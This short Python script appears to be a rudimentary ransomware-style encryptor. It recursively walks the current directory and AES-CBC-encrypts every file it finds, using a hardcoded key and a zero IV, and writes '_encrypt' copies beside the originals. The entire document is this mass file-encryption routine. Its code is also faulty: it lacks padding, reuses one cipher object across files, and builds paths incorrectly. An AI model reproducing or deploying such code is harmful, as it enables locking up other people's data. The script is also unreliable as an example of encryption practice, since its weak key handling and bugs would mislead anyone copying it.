import os
from Crypto.Cipher import AES
#import os.walk
#import os.getcwd

key = 'passwordhahahihi'
IV = 16 * '\x00'
mode = AES.MODE_CBC
encrpytor = AES.new(key, mode, IV=IV)


hasil = os.walk(os.getcwd());
print(hasil)
filea = []
for root, dirs, files in hasil:
	for name in files:
		file = os.path.join(root, name)
		#print(file)

		#print(file)
		filea.append(file)

for f in filea:
	print(f)
	#print(str(os.path.join(os.path.dirname(f), (f + "_encrypt"))))
	#with open(f, 'rb') as infile:
	#	with open(str(os.path.join(os.path.dirname(f), (f + "_encrypt"))), 'wb') as outfile:
	a = open(f, 'rb')
	b = a.read()
	a.close()
	c = open(str(os.path.join(os.path.dirname(f), (f + "_encrypt"))), 'wb')
	encrpyted = encrpytor.encrypt(b)
	c.write(encrpyted)
	c.close()






